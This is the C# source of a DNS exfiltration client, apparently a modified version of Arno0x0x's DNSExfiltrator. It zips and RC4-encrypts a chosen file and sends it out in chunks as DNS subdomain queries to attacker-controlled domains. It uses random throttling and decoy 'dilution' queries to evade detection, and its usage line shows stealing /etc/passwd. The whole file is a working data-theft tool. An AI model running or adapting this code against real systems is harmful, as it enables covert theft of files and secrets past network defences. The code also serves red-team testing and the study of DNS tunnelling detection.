/*
Author: Arno0x0x, Twitter: @Arno0x0x  
Modified by: Kristijan Ziza
*/
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;
using System.Diagnostics;


namespace DNSExfiltrator
{
    [ComVisible(true)]
    public class DNSExfiltrator
    {
        private static string[] map = new string[] { "kit", "van", "web", "you", "for", "set", "big", "fin", "sly", "app", "get", "hot", "mix", "dug", "ace", "arm", "era", "red", "led", "not", "hut", "car", "pen", "man", "she", "all", "sin", "leo", "sir", "run", "cut", "chi" };

        public DNSExfiltrator() { }

        private static void PrintUsage()
        {
            Console.WriteLine("Usage: mono DNSExfiltrator.exe <file> <domain> <password> [options]");
            Console.WriteLine("");
            Console.WriteLine("Options:");
            Console.WriteLine("  s=<server>    DNS server IP address");
            Console.WriteLine("  t=<ms>        Throttle time in milliseconds");
            Console.WriteLine("  tr=<ms>       Random throttle (0 to ms)");
            Console.WriteLine("  l=<size>      Max label length (default: 63)");
            Console.WriteLine("  e=<encoding>  Encoding: base32map, base32, base64, hex (default: base32map)");
            Console.WriteLine("  retry=<n>     Max retry attempts (default: 3)");
            Console.WriteLine("  retrydelay=<ms>  Delay before retry (default: 1000)");
            Console.WriteLine("  dil=<count>  Number of dilution requests sent between two tunneling requests (default: 0)");
            Console.WriteLine("");
            Console.WriteLine("Example:");
            Console.WriteLine("  mono DNSExfiltrator.exe /etc/passwd test.com pass123 s=127.0.0.1 e=base64 l=20");
        }

        private static void PrintColor(string text)
        {
            if (text.StartsWith("[!]")) Console.ForegroundColor = ConsoleColor.Red;
            else if (text.StartsWith("[+]")) Console.ForegroundColor = ConsoleColor.Green;
            else if (text.StartsWith("[*]")) Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine(text);
            Console.ForegroundColor = ConsoleColor.White;
        }

        private static void Throttle(int throttleTime, int throttleRandomTime, Random rnd)
        {
            int waiting_time = throttleTime;
            if (throttleRandomTime > 0) waiting_time += (rnd.Next(throttleRandomTime));
            Console.Write("[*] Waiting for " + waiting_time + "ms" + "\n");
            if (waiting_time > 0) Thread.Sleep(waiting_time);
        }

        private static string ToBase32(byte[] data)
        {
            return Base32.ToBase32String(data).Replace("=", "");
        }

        private static string ToBase64(byte[] data)
        {
            return Convert.ToBase64String(data).Replace("=", "").Replace("+", "-").Replace("/", "_");
        }

        private static string ToHex(byte[] data)
        {
            return BitConverter.ToString(data).Replace("-", "").ToLower();
        }

        private static string ToBase32Map(byte[] data)
        {
            string encoded = ToBase32(data);
            StringBuilder result = new StringBuilder();

            for (int i = 0; i < encoded.Length; i++)
            {
                char c = encoded[i];
                int val = Base32.CharToInt(c);
                if (val >= 0 && val < map.Length)
                    result.Append(map[val]);
            }

            return result.ToString();
        }

        private static string Encode(byte[] data, string encoding)
        {
            if (encoding == "base32") return ToBase32(data);
            if (encoding == "base64") return ToBase64(data);
            if (encoding == "hex") return ToHex(data);
            return ToBase32Map(data);
        }

        private static int EncodingToNumber(string encoding)
        {
            if (encoding == "base32map") return 0;
            if (encoding == "base32") return 1;
            if (encoding == "base64") return 2;
            if (encoding == "hex") return 3;
            return 0;
        }

        private static string buildDilutionDomain(Random rnd)
        {
            char[] vowels = new char[] { 'a', 'e', 'i', 'o', 'u', 'w'};
            char baseChar = vowels[rnd.Next(vowels.Length)];
            int length = rnd.Next(1,3);
            string subdomain = new string(baseChar, length);
            return subdomain;
        }

        private static bool VerifyAck(string reply, int expectedValue)
        {
            if (String.IsNullOrEmpty(reply)) return false;

            try
            {
                string[] octets = reply.Split('.');
                if (octets.Length != 4) return false;

                int lastOctet = Convert.ToInt32(octets[3]);
                return lastOctet == expectedValue;
            }
            catch
            {
                return false;
            }
        }

        public static void Main(string[] args)
        {
            string filePath = String.Empty;
            string[] domainList;
            string password = String.Empty;
            string dnsServer = "";
            int throttleTime = 0;
            int throttleRandomTime = 0;
            int labelMaxSize = 63;
            string encoding = "base32map";
            int maxRetries = 3;
            int retryDelay = 1000;
            int dilRate = 0;

            if (args.Length < 3)
            {
                PrintColor("[!] Missing arguments");
                PrintUsage();
                return;
            }

            filePath = args[0];
            string domainFile = args[1];
            password = args[2];

            // Parse optional args
            if (args.Length > 3)
            {
                int i = 3;
                while (i < args.Length)
                {
                    if (args[i].StartsWith("s=")) dnsServer = args[i].Split('=')[1];
                    else if (args[i].StartsWith("t=")) throttleTime = Convert.ToInt32(args[i].Split('=')[1]);
                    else if (args[i].StartsWith("tr=")) throttleRandomTime = Convert.ToInt32(args[i].Split('=')[1]);
                    else if (args[i].StartsWith("l=")) labelMaxSize = Convert.ToInt32(args[i].Split('=')[1]);
                    else if (args[i].StartsWith("e=")) encoding = args[i].Split('=')[1];
                    else if (args[i].StartsWith("retry=")) maxRetries = Convert.ToInt32(args[i].Split('=')[1]);
                    else if (args[i].StartsWith("retrydelay=")) retryDelay = Convert.ToInt32(args[i].Split('=')[1]);
                    else if (args[i].StartsWith("dil=")) dilRate = Convert.ToInt32(args[i].Split('=')[1]);
                    i++;
                }
            }

            if (!File.Exists(filePath))
            {
                PrintColor("[!] File not found: " + filePath);
                return;
            }

            if (!File.Exists(domainFile))
            {
                PrintColor("[!] Domain List not found: " + domainFile);
                return;
            }

            // Read domains from file
            domainList = File.ReadAllLines(domainFile).Where(line => !string.IsNullOrWhiteSpace(line)).ToArray();
            
            if (domainList.Length == 0)
            {
                PrintColor("[!] No valid domains found in " + domainFile);
                return;
            }

            PrintColor("[*] DNS Exfiltrator Client");
            PrintColor("[*] File: " + filePath);
            PrintColor("[*] Domains: " + string.Join(", ", domainList));
            PrintColor("[*] Encoding: " + encoding);
            PrintColor("[*] Max label size: " + labelMaxSize);
            PrintColor("[*] Max retries: " + maxRetries);
            PrintColor("[*] Retry delay: " + retryDelay + "ms");
            PrintColor("[*] Dilution Queries per Request: " + dilRate);

            // ZIP file
            byte[] zipData;
            using (var zipStream = new MemoryStream())
            {
                using (var archive = new ZipArchive(zipStream, ZipArchiveMode.Create, true))
                {
                    var entry = archive.CreateEntry(Path.GetFileName(filePath));
                    using (var entryStream = entry.Open())
                    using (var fileStream = new FileStream(filePath, FileMode.Open))
                    {
                        fileStream.CopyTo(entryStream);
                    }
                }
                zipData = zipStream.ToArray();
            }

            PrintColor(String.Format("[*] File size: {0} bytes", zipData.Length));

            // Calculate effective label size for base32map (must be multiple of 3)
            int effectiveLabelSize = labelMaxSize;
            if (encoding == "base32map")
            {
                effectiveLabelSize = (labelMaxSize / 3) * 3;  // Round down to multiple of 3
                PrintColor(String.Format("[*] Effective label size (base32map): {0} chars", effectiveLabelSize));
            }

            // INIT with file size (not totalRequests)
            string initPayload = EncodingToNumber(encoding) + "|" + zipData.Length;
            string initEnc = ToBase32Map(Encoding.UTF8.GetBytes(initPayload)).ToLower();

            PrintColor("[*] Init payload: " + initPayload);
            PrintColor("[*] Init encoded: " + initEnc + " (" + initEnc.Length + " chars)");

            int initChunks = (int)Math.Ceiling((double)initEnc.Length / labelMaxSize);
            PrintColor(String.Format("[*] Sending init in {0} request(s)...", initChunks));

            // Send init with retry
            Random rnd = new Random();
            for (int i = 0; i < initChunks; i++)
            {
                int len = Math.Min(labelMaxSize, initEnc.Length - (i * labelMaxSize));
                string initPart = initEnc.Substring(i * labelMaxSize, len);
                string request = initPart + "." + domainList[i % domainList.Length];

                bool success = false;
                for (int attempt = 0; attempt < maxRetries && !success; attempt++)
                {
                    if (attempt > 0)
                    {
                        PrintColor(String.Format("[*] Retry {0}/{1} for init part {2}", attempt, maxRetries, i + 1));
                        Thread.Sleep(retryDelay);
                    }

                    try
                    {
                        string reply = String.IsNullOrEmpty(dnsServer) ?
                            DNSResolver.GetARecord(request) :
                            DGResolver.GetARecord(dnsServer, request);

                        if (!String.IsNullOrEmpty(reply))
                        {
                            PrintColor("[+] Init part " + (i + 1) + " OK (Reply: " + reply + ")");
                            success = true;
                        }
                    }
                    catch (Exception e)
                    {
                        PrintColor("[!] Init part " + (i + 1) + " failed: " + e.Message);
                    }
                }

                if (!success)
                {
                    PrintColor("[!] Init failed after " + maxRetries + " attempts");
                    return;
                }

                Throttle(throttleTime, throttleRandomTime, rnd);
            }

            PrintColor("[+] Init complete!");

            // Create RC4 instance for streaming encryption (maintains state)
            RC4 rc4 = new RC4(Encoding.UTF8.GetBytes(password));

            // Calculate chunk size in bytes based on encoding (account for encoding overhead)
            int chunkSize;
            switch (encoding)
            {
                case "base64":
                    // base64: 4 bytes = 3 chars
                    chunkSize = effectiveLabelSize / 4 * 3;
                    break;
                case "hex":
                    // hex: 1 byte = 2 chars
                    chunkSize = effectiveLabelSize / 2;
                    break;
                case "base32map":
                case "base32":
                    // base32: 5 bytes = 8 chars (5 bits per base32 char)
                    chunkSize = (effectiveLabelSize * 5) / 8;
                    break;
                default:
                    // fallback to base64 calculation
                    chunkSize = effectiveLabelSize / 4 * 3;
                    break;
            }

            // Send data with ACK verification
            int requestsSent = 0;
            int totalBytesSent = 0;

            for (int offset = 0; offset < zipData.Length; offset += chunkSize)
            {
                if (dilRate > 0 && requestsSent != 0)
                {
                    for (int i = 0; i < dilRate; i++)
                    {
                        string dil_request = buildDilutionDomain(rnd) + "." + domainList[(requestsSent + initChunks) % domainList.Length];
                        string dil_reply = String.IsNullOrEmpty(dnsServer) ?
                            DNSResolver.GetARecord(dil_request) :
                            DGResolver.GetARecord(dnsServer, dil_request);

                        if (!String.IsNullOrEmpty(dil_reply))
                        {
                            PrintColor("[+] Dilution sent");
                        }
                    }
                }

                int len = Math.Min(chunkSize, zipData.Length - offset);
                byte[] chunk = new byte[len + 1]; // +1 for sequence number
                chunk[0] = (byte)(requestsSent % 256); // Sequence number
                Array.Copy(zipData, offset, chunk, 1, len);

                // Encrypt this chunk with seq_number (RC4 maintains state)
                byte[] encryptedChunk = rc4.Encrypt(chunk, chunk.Length);

                // Encode
                string encodedChunk = Encode(encryptedChunk, encoding).ToLower();

                // Send as single label (no separate sequence number)
                string request = encodedChunk + "." + domainList[(requestsSent + initChunks) % domainList.Length];

                bool success = false;
                for (int attempt = 0; attempt < maxRetries && !success; attempt++)
                {
                    if (attempt > 0)
                    {
                        Thread.Sleep(retryDelay);
                    }

                    try
                    {
                        string reply = String.IsNullOrEmpty(dnsServer) ?
                            DNSResolver.GetARecord(request) :
                            DGResolver.GetARecord(dnsServer, request);

                        if (VerifyAck(reply, requestsSent % 256))
                        {
                            success = true;
                            requestsSent++;
                            totalBytesSent += len;
                            Console.Write("[+] Progress: {0} bytes    \n", totalBytesSent);
                        }
                        else
                        {
                            if (attempt < maxRetries - 1)
                            {
                                Console.Write("\r[!] Wrong ACK, retrying... ({0}/{1})    ", attempt + 1, maxRetries);
                            }
                        }
                    }
                    catch
                    {
                        if (attempt < maxRetries - 1)
                        {
                            Console.Write("\r[!] Request failed, retrying... ({0}/{1})    ", attempt + 1, maxRetries);
                        }
                    }
                }

                if (!success)
                {
                    Console.WriteLine();
                    PrintColor(String.Format("[!] Failed to send request {0} after {1} attempts", requestsSent, maxRetries));
                    return;
                }

                Throttle(throttleTime, throttleRandomTime, rnd);
            }

            Console.WriteLine();
            PrintColor("[+] Done!");
        }

        public class RC4
        {
            private byte[] S = new byte[256];
            private int x = 0;
            private int y = 0;

            public RC4(byte[] key)
            {
                for (int i = 0; i < 256; i++) S[i] = (byte)i;
                int j = 0;
                for (int i = 0; i < 256; i++)
                {
                    j = (j + S[i] + key[i % key.Length]) & 0xFF;
                    byte temp = S[i]; S[i] = S[j]; S[j] = temp;
                }
            }

            public byte[] Encrypt(byte[] data, int size)
            {
                byte[] result = new byte[size];
                Array.Copy(data, result, size);
                for (int i = 0; i < size; i++)
                {
                    x = (x + 1) & 0xFF;
                    y = (y + S[x]) & 0xFF;
                    byte temp = S[x]; S[x] = S[y]; S[y] = temp;
                    result[i] ^= S[(S[x] + S[y]) & 0xFF];
                }
                return result;
            }
        }

        public static class Base32
        {
            private static string base32Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

            public static string ToBase32String(byte[] data)
            {
                StringBuilder result = new StringBuilder();
                int buffer = data[0];
                int next = 1;
                int bitsLeft = 8;

                while (bitsLeft > 0 || next < data.Length)
                {
                    if (bitsLeft < 5)
                    {
                        if (next < data.Length)
                        {
                            buffer <<= 8;
                            buffer |= data[next++];
                            bitsLeft += 8;
                        }
                        else
                        {
                            int pad = 5 - bitsLeft;
                            buffer <<= pad;
                            bitsLeft += pad;
                        }
                    }
                    int index = (buffer >> (bitsLeft - 5)) & 0x1F;
                    bitsLeft -= 5;
                    result.Append(base32Alphabet[index]);
                }
                return result.ToString();
            }

            public static int CharToInt(char c)
            {
                return base32Alphabet.IndexOf(char.ToUpper(c));
            }
        }

        public static class DNSResolver
        {
            public static string GetARecord(string domain)
            {
                IPHostEntry hostEntry = Dns.GetHostEntry(domain);
                return hostEntry.AddressList.Length > 0 ? hostEntry.AddressList[0].ToString() : "";
            }
        }

        public static class DGResolver
        {
            public static string GetARecord(string dnsServer, string domain)
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "dig";
                psi.Arguments = String.Format("@{0} {1} +short", dnsServer, domain);
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                Process proc = Process.Start(psi);
                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();
                return output.Trim();
            }
        }
    }
}
